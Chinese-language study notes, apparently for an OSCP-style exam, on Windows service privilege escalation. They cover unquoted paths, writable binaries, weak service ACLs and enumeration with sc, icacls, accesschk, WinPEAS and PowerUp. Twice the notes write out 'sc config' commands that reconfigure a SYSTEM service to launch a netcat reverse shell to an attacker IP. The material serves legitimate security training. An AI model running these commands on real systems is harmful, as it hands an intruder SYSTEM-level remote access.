# Windows Service

## 介绍

Windows Service（服务）本质是：由Service Control Manager (SCM)管理的长期后台进程。

关键点：很多服务是LocalSystem（SYSTEM）权限跑的

所以服务提权的核心逻辑就是：

如果我能影响”一个以SYSTEM启动的服务“执行程序/参数/加载的DLL，我就能拿到SYSTEM。

## 1.Unquoted Service Path（未加引号的路径）

### 现象：服务路径含有空格，但没用引号括起来。

例如：C:\Program Files\Vuln Service\service.exe

没加引号时，Windows按顺序尝试

C:\Program.exe

C:\Program Files\Vuln.exe

C:\Program Files\Vuln Service\service.exe

如果能在前面某个位置可写入文件，并且服务能被重启/系统重启，就能提权

### 利用条件：

1）BINARY_NAME_PATH有空格且没有引号

2）能够在空格分割的位置写文件

3）能重启服务或重启电脑

## 2.Service Binary Hijack（可写服务二进制/目录）

### 现象：服务的BINARY_PATH_NAME指向的exe（或其目录）对普通用户可写

如果能够替换它， 服务一启动就执行你的东西。（以服务权限执行）

### 利用条件：

1）服务跑的账号是高权限

2）目标exe或目录我能够写

3）你能触发服务启动（start/restart/auto）

## 3.服务权限配置错误（能改配置/能重启）

就算你不能写配置，如果你对服务有权限（典型：能改binPath、能stop/start），也可能把服务改成执行你指定的程序

### 利用条件：

1）服务跑的是高权限账号

2）你对服务有CHANGE_CONFIG至少有START/STOP

3）能把服务执行内容改成你的指定命令/程序触发

## 如何枚举服务？

找“服务的路径、启动账号、状态”

sc qc <ServiceName>

sc query <ServiceName>

重点看sc qc输出里的三个字段

BINARY_PATH_NAME：程序路径（是否含有空格，引号）

SERVICE_START_NAME：用哪个账号跑（LocalSystem最值钱）

START_TYPE：auto还是demand（影响触发方式）

## 常用服务

| **服务类型**           | **常见服务名称**                                             | **劫持方式**                                  | **为什么常见？**                                             |
| ---------------------- | ------------------------------------------------------------ | --------------------------------------------- | ------------------------------------------------------------ |
| **UPnP / SSDP 服务**   | upnphost SSDPSRV                                             | 弱权限（SERVICE_ALL_ACCESS 或 CHANGE_CONFIG） | 老版本 Windows（如 Win7/2008）默认弱权限，Authenticated Users 可改 binpath。经典示例：用 `sc config upnphost binpath= "nc.exe -e cmd IP PORT"` |
| **卷影复制服务**       | VSS (Volume Shadow Copy)                                     | 弱权限或可写路径                              | 如你之前例子，常以 SYSTEM 运行，非关键服务，易修改 binpath（即使 start 报 1053 错误，payload 已执行）。 |
| **其他经典弱权限服务** | dakeyboard AudioSrv McShield                                 | 可替换二进制或改 binpath                      | 第三方软件（如旧版 McAfee、键盘驱动）常给 Everyone Full Control。 |
| **无引号路径常见服务** | 第三方如： "C:\Program Files\Some App\Service.exe" 常见路径：C:\Program Files... | 在空格中间目录放恶意 exe（如 C:\Program.exe） | 安装程序未加引号，常见于自定义服务。检查命令：`wmic service get name,pathname |
| **AD/域环境额外**      | BITS wuauserv ikeext                                         | DLL 劫持或弱注册表权限                        | 附件 "goadv2.pdf" 和 AD 笔记中常见，用于域提权。             |

## 如何判断我有没有权限动它？

icacls "C:\Path\to\service.exe"

icacls "C:\Path\to\"

如果看到当前用户/User/Authenticated Users 有

(W)/(M)/(F)这类写权限->可能提权

## 如何判断是否能控制服务？

### 看服务ACL(权限):

sc sdshow <ServiceName>

这串很难读，考试更常用Sysinternals的accesschk

accesschk.exe -uwcqv <username> <ServiceName>

关注：

SERVICE_START

SERVICE_STOP

SERVICE_CHANGE_CONFIG

说明我能触发或者改配置

## icacls

### 介绍

icacls = i can access control lists，本质：查看/修改ACL（访问控制表）

ACL =  Access Control List（访问控制列表）

谁（用户/组）对这个（文件/目录）有什么权限（读/写/执行/修改）

Windows文件权限全靠ACL控制

icacls C:\Program Files\App\

BUILTIN\Users:(RX)
	NT AUTHORITY\SYSTEM:(F)

### 权限

| 缩写 | 英文             | 含义     | 提权价值 |
| ---- | ---------------- | -------- | -------- |
| F    | Full control     | 完全控制 | ⭐⭐⭐⭐⭐    |
| M    | Modify           | 修改     | ⭐⭐⭐⭐⭐    |
| W    | Write            | 写       | ⭐⭐⭐⭐⭐    |
| RX   | Read & Execution | 读+执行  | ❌        |
| R    | Read             | 只读     | ❌        |

## sc

### 介绍

sc = Service Control（服务控制工具）

用来查询/启动/停止/配置Windows服务

### qc（query configuration）

查询服务配置

执行 sc qc VulnService

就在问这个系统这个服务是怎么配置的？

BINARY_PATH_NAME   : C:\Program Files\Vuln Service\service.exe
	SERVICE_START_NAME : LocalSystem
	START_TYPE         : AUTO_START

| 字段               | 翻译               | 提权意义              |
| ------------------ | ------------------ | --------------------- |
| BINARY_PATH_NAME   | 服务启动跑那个程序 | 看有没有空格/能不能写 |
| SERVICE_START_NAME | 用谁的权限跑       | SYSTEM就有意义        |
| START_TYPE         | 自动还是手动       | 自动=重启触发         |

### query

查询服务状态

执行sc query VulnService

就在问这个服务现在在干嘛？

STATE : 4  RUNNING

| 状态     | 思考                             |
| -------- | -------------------------------- |
| RUNNING  | 我能不能把它停下来然后重新启动？ |
| STOP     | 我能不能把它启动？               |
| DISABLED | 我能不能改配置？                 |

### qc、query

| 命令     | 查的是 |
| -------- | ------ |
| sc qc    | 配置   |
| sc query | 状态   |

## 自动化枚举工具

用 **WinPEAS.exe**（强烈推荐，附件 Cheat Sheet 如 "OSCP_Cheat_Sheet_-_Thor-Sec.pdf" 提到）：运行 winpeas.exe quiet servicesinfo，它会高亮 "YOU CAN MODIFY THIS SERVICE" 或 "Unquoted Service Path"。

用 **PowerUp.ps1**：Invoke-AllChecks，列出 ModifiableServices。

## 手动

1)sc qc <服务名> 检查 binpath 和权限

2)accesschk.exe -ucqv <服务名> 检查 CHANGE_CONFIG 权限

accesschk.exe -uwcqv "Authenticated Users" *

icacls "C:\path\to\service.exe"

sc config <服务名> binpath= "C:\ProgramData\nc64.exe -e cmd.exe YOUR_IP 443"

sc start <服务名>